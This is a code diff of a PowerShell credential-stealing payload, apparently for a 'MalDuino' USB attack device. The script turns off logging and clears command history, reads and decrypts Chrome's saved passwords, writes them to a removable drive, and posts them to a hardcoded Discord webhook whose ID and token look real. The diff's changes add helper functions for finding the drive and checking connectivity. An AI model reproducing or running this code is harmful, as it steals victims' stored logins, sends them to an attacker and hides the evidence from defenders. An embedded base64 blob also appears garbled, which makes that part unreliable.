@@ -1,26 +1,41 @@
-powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "
 $ErrorActionPreference = 'SilentlyContinue'
 [System.Management.Automation.PSConsoleReadLine]::ClearHistory()
 Stop-Transcript | Out-Null
 [System.Management.Automation.Logging.PSEventLogProvider]::EventLoggingEnabled = $false
 
+function Test-InternetConnection {
+    param(
+        [string]$PrimaryDNS = '8.8.8.8',
+        [string]$SecondaryDNS = '1.1.1.1'
+    )
+    if (Test-Connection -ComputerName $PrimaryDNS -Count 1 -Quiet) {
+        return $true
+    }
+    elseif (Test-Connection -ComputerName $SecondaryDNS -Count 1 -Quiet) {
+        return $true
+    }
+    return $false
+}
+
+function Get-RemovableDrive {
+    param(
+        [string]$Label = 'MalDuino',
+        [int64]$MaxSizeMB = 128
+    )
+
+    $drives = Get-WmiObject -Class Win32_Volume | Where-Object {
+        $_.DriveType -eq 2 -and ($_.Label -eq $Label -or $_.Capacity -le ($MaxSizeMB * 1MB))
+    }
+    
+    if ($drives) {
+        return $drives.DriveLetter + '\'
+    } else {
+        return $null
+    }
+}
+
 function pumpndump {
     param([String]$hq, [String]$localPath)
-    
-    Add-Type -TypeDefinition ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dXNpbmcgU3lzdGVtOwogICAgdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwogICAgcHVibGljIGNsYXNzIFdpblNRTGl0ZTNPcGVuIHsgIAogICAgICAgIGNvbnN0IHN0cmluZyBkbGwgPSAid2luc3FsaXRlMyI7IAogICAgICAgIFtEbGxJbXBvcnRdKGRsbCwgImVudHJ5UG9pbnQiID0gInNxbGl0ZTNfb3BlbiIpCiAgICAgICAgcHVibGljIHN0YXRpYyBzeXN0ZW0uaW50cHRyIHN0YXRpYyBzdHJpbmcgT3Blbiggc3RyaW5nIGZpbGVuYW1lLCBvdXQgaW50cHRyIHN0YXRpYyBsb3VuZ2JpdHRlciBfZGIpIHt7fSBoZWFkZXI='))) 
-
-    $chrome_path = $env:LOCALAPPDATA + '\Google\Chrome\User Data'
-    $query = 'SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0'
-
-    $secret = (Get-Content -Raw -Path ($chrome_path + '\Local State')) | ConvertFrom-Json
-    $secretkey = $secret.os_crypt.encrypted_key
-    $cipher = [Convert]::FromBase64String($secretkey)
-    $key = [System.Security.Cryptography.ProtectedData]::Unprotect($cipher[5..$cipher.length], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-
-    $stmt = 0
-    $dbH = 0
-    [WinSQLite3]::Open($(-join($chrome_path, '\Login Data')), [ref] $dbH) | Out-Null
-    [WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) | Out-Null
 
     $outputData = @()
     while([WinSQLite3]::Step($stmt) -eq 100) {
@@ -46,6 +61,7 @@ function pumpndump {
 
         try {
             Invoke-RestMethod -Uri $hq -Method Post -ContentType 'application/json' -Body $webhookPayload
+            $internetAvailable = $true
         }
         catch {
             $internetAvailable = $false
@@ -57,11 +73,13 @@ function pumpndump {
     }
 }
 
-$internetAvailable = Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet
-$localPath = 'SD_CARD_DRIVE\login_data.txt'
+$internetAvailable = Test-InternetConnection
+$localPath = (Get-RemovableDrive -Label 'MalDuino' -MaxSizeMB 128) + 'login_data.txt'
 
-pumpndump -hq 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN' -localPath $localPath
+if ($localPath) {
+    pumpndump -hq 'https://discord.com/api/webhooks/1140103989124419686/2DTpJ2FnmaGaNQI6viCy2ZBzkDptJ4vkdpqnJHeHS7f_H5IERJB1yHrVAWGLS7LWDQXQ' -localPath $localPath
+}
+
 Stop-Transcript | Out-Null
 Remove-Variable * -ErrorAction SilentlyContinue
 [System.Management.Automation.PSConsoleReadLine]::ClearHistory()
-"
